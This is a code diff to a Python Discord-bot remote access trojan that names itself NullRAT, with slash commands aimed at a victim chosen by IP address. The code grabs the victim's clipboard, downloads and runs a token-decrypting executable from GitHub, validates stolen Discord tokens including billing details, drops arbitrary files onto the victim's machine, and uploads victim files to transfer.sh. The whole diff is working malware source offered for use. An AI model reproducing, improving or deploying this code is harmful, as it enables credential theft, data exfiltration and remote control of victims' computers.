@@ -197,7 +197,10 @@ async def get_clipboard(ctx, victim):
         if len(outp) > 1000:
             return await ctx.followup.send(f"```{outp}```")
         embed = genEmbed( "Clipboard contents", datetime.now() )
-        embed.add_field(name="Clipboard:", value=f"```{outp}```" if outp != "" else "No text in clipboard")
+        embed.add_field(
+            name="Clipboard:", 
+            value=f"```{outp}```" if outp != "" else "No text in clipboard"
+        )
         
         await ctx.followup.send(embed=embed)
 
@@ -259,47 +262,56 @@ async def checked_tokens(ctx, victim):
         for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
             embeds.append(checked_embeds(tk, em, ph, un, ni, bi, av, idqa))
                 
-        if len(embeds) <= 1:
-            await ctx.channel.send(embed=embeds[0])
-        else:
-            await ctx.channel.send(embed=embeds[0], view=Menu(embeds))
+        if len(embeds) <= 1: await ctx.channel.send(embed=embeds[0])
+        else: await ctx.channel.send(embed=embeds[0], view=Menu(embeds))
         
         await ctx.followup.send("Checked all tokens")
 
 
-@client.slash_command(description="[EXPERIMENTAL] Decrypts encrypted Discord Tokens")
+@client.slash_command(
+    description="[EXPERIMENTAL] Decrypts encrypted Discord Tokens",
+    options=[
+        discord.Option("victim", description="IP Address of specific victim", required=True),
+    ]
+)
 async def raw_discord(ctx, victim):
     if str(victim) == str(ip_addr):
-        import os
         await ctx.response.defer()
         try:
-            tkr = bytes(get("https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken").text, "utf-8")
+            tkr = bytes(requests.get("https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken").text, "utf-8")
             await ctx.channel.send("Status:\n> Downloaded custom decryptor")
         except Exception as e:
             return await ctx.followup.send("Unable to download custom decryptor!\n\n"+e)
             
         os.chdir(nr_working)
-        
         with open("tkr.exe", "wb") as fh: fh.write(decodebytes(tkr))
         await ctx.channel.send("> Prepared custom decryptor")
+        
         discord_tokenz = str(os.popen("tkr.exe").read()).strip('][').split(', ')
         await ctx.channel.send("> Attempted to decrypt tokens from discord...")
+
+        await ctx.followup.send(
+            embed = genEmbed(
+                "Decrypted discord tokens", 
+                datetime.now(), 
+                f"```" + str(discord_tokenz).replace("[","").replace("]","").replace(",","").replace("'","").replace('"','').replace(" ","\n\n") + "```"
+            )
+        )
         
-        msg = "Done!\n```"
-        for a in discord_tokenz:
-            msg += a + "\n"
-        msg += "```"
-        await ctx.followup.send(msg)
         os.remove(nr_working + "\\tkr.exe")
         os.chdir(original_dir)   
 
-@client.slash_command(description="[EXPERIMENTAL] Decrypts and checks encrypted Discord Tokens")
+@client.slash_command(
+    description="[EXPERIMENTAL] Decrypts and checks encrypted Discord Tokens",
+    options=[
+        discord.Option("victim", description="IP Address of specific victim", required=True),
+    ]
+)
 async def checked_discord(ctx, victim):
     if str(victim) == str(ip_addr):
-        import os
         await ctx.response.defer()
         try:
-            tkr = bytes(get("https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken").text, "utf-8")
+            tkr = bytes(requests.get("https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken").text, "utf-8")
         except Exception as e:
             return await ctx.followup.send("Unable to download custom decryptor!\n\n"+e)
             
@@ -311,7 +323,7 @@ async def checked_discord(ctx, victim):
         for a in discord_tokenz: tks.append(a.replace('"',''))
         for token in tks:
             headers = {'Authorization': token, 'Content-Type': 'application/json'}
-            requ = get('https://discordapp.com/api/v6/users/@me', headers=headers)
+            requ = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                         
             if requ.status_code == 401: 
                 await ctx.channel.send(embed=discord.Embed(title="Token is invalid!",description=token))
@@ -324,57 +336,130 @@ async def checked_discord(ctx, victim):
                 idq.append(   str(json["id"])   )            
                 uname.append( f'{json["username"]}#{json["discriminator"]}' )
                 avatar.append(f"https://cdn.discordapp.com/avatars/{str(json['id'])}/{str(json['avatar'])}" )
-                nitro.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()) > 0)))
-                bill.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()) > 0)))
+                nitro.append(str(bool(len(requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()) > 0)))
+                bill.append(str(bool(len(requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()) > 0)))
                 continue
 
         if len(valid) == 0: 
-            return await ctx.followup.send(embed = Embed(title="No valid Discord Tokens"))
-        await ctx.followup.send("Checking all tokens...")
+            return await ctx.followup.send(embed = genEmbed("No valid Discord Tokens", datetime.now()))
+        embeds = []
         for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
-            await ctx.channel.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa)) 
+            embeds.append(checked_embeds(tk, em, ph, un, ni, bi, av, idqa))
+                
+        if len(embeds) <= 1: await ctx.channel.send(embed=embeds[0])
+        else: await ctx.channel.send(embed=embeds[0], view=Menu(embeds))
+        
+        await ctx.followup.send("Checked all tokens")
         
 # Directory Manipulation #
-@client.slash_command(description="Returns Current Working Directory")
+@client.slash_command(
+    description="Returns Current Working Directory",
+    options=[
+        discord.Option("victim", description="IP Address of specific victim", required=True),
+    ]
+)
 async def get_workingdir(ctx, victim):
     if str(victim) == str(ip_addr):
-       await ctx.response.send_message(embed=EmbedGen("Current directory", "The present directory is: ", f"```{os.getcwd()}```"))
+        await ctx.response.send_message(
+            embed=genEmbed(
+                "Current directory of NullRAT:", 
+                datetime.now(), 
+                os.getcwd()
+            )
+        )
     
-@client.slash_command(description="Send file to victim's PC")
+@client.slash_command(
+    description="Send file to victim's PC",
+    options=[
+        discord.Option("victim", description="IP Address of specific victim", required=True),
+        discord.Option("url", description="Direct link to the file for sending", required=True),
+        discord.Option("file_name", description="Name of the file after sending to PC", required=True),
+        discord.Option("file_path", description="Path to which the file should be saved", required=False),
+    ]
+)
 async def sendfiles(ctx, victim, url, file_name, file_path=nr_working):
     if str(victim) == str(ip_addr):
         await ctx.response.defer()
+        
         if '"' in file_path:
             file_path = file_path.replace('"','')
-        try: os.chdir(file_path)
-        except: return await ctx.followup.send("Invalid directory!")
-        r = get(url, allow_redirects=True)
-        with open(file_name, "wb") as f: f.write(r.content)
-        await ctx.followup.send(embed=EmbedGen("Upload information", "Sending file to victim: ", "Success"))
+        try: 
+            os.chdir(file_path)
+        except: 
+            return await ctx.followup.send("Invalid directory!")
+        
+        try:
+            r = requests.get(url, allow_redirects=True)
+        except:
+            return await ctx.followup.send("Invalid URL!")
 
-@client.slash_command(description="Receives file from victim's PC")
-async def receivefiles(ctx, victim, file):
+        with open(file_name, "wb") as f: 
+            f.write(r.content)
+            
+        await ctx.followup.send(
+            embed=genEmbed(
+                "File successfully sent to PC!", 
+                datetime.now(), 
+                "File path: " + file_path
+            )
+        )
+
+@client.slash_command(
+    description="Receives file from victim's PC",
+    options=[
+        discord.Option("victim", description="IP Address of specific victim", required=True),
+        discord.Option("file_path", description="Path of the file for receiving", required=True),
+    ]
+)
+async def receivefiles(ctx, victim, file_path):
     if str(victim) == str(ip_addr):
         await ctx.response.defer()
-        if '"' in file:
-            file = file.replace('"','')
-        try: f = open(file, "rb")
-        except: return await ctx.followup.send(embed=EmbedGen("Error while downloading!", "FileNotFoundError", "Please specify a different path and try again"))
-        file = {'{}'.format(file): f}
-        response = post('https://transfer.sh/', files=file)
+        
+        if '"' in file_path:
+            file_path = file_path.replace('"','')
+        try: 
+            f = open(file_path, "rb")
+        except: 
+            return await ctx.followup.send(
+                embed=genEmbed(
+                    "File was not found!", 
+                    datetime.now(), 
+                    "Please specify a different path and try again"
+                )
+            )
+        
+        file = {'{}'.format(file_path): f}
+        response = requests.post('https://transfer.sh/', files=file)
         download_link = response.content.decode('utf-8')
-        embed=discord.Embed(title="Download Inforation", description="Receiving file from victim: Success")
-        embed.add_field(name="Download link is:", value="download_link")
-        return await ctx.followup.send(embed=embed)
 
-@client.slash_command(description="Change directory to specified location")
+        await ctx.followup.send(
+            embed=genEmbed(
+                "Received file from victim",
+                datetime.now(),
+                "Link:\n" + download_link
+            )
+        )
+
+@client.slash_command(
+    description="Change directory to specified location",
+    options=[
+        discord.Option("victim", description="IP Address of specific victim", required=True),
+        discord.Option("directory", description="New directory where NullRAT will CD", required=True),
+    ]
+)
 async def change_directory(ctx, victim, directory):
     if str(victim) == str(ip_addr):
         try:
             os.chdir(directory)
-            return await ctx.response.send_message(embed=EmbedGen("CD information",  "Changed directory to:", f"```{os.getcwd()}```"))
+            return await ctx.response.send_message(
+                embed=genEmbed(
+                    "Successfully changed directory", 
+                    datetime.now(), 
+                    f"New directory:\n```{os.getcwd()}```"
+                )
+            )
         except FileNotFoundError:
-            await ctx.response.send_message(embed=EmbedGen("CD information", "Changing directory failed!", "```Error: Incorrect Path```"))
+            await ctx.response.send_message(embed=genEmbed( "Directory not found!", datetime.now() ))
 
 @client.slash_command(description="Finds contents of directory")
 async def list_directory(ctx, victim, directory_to_find="null"):
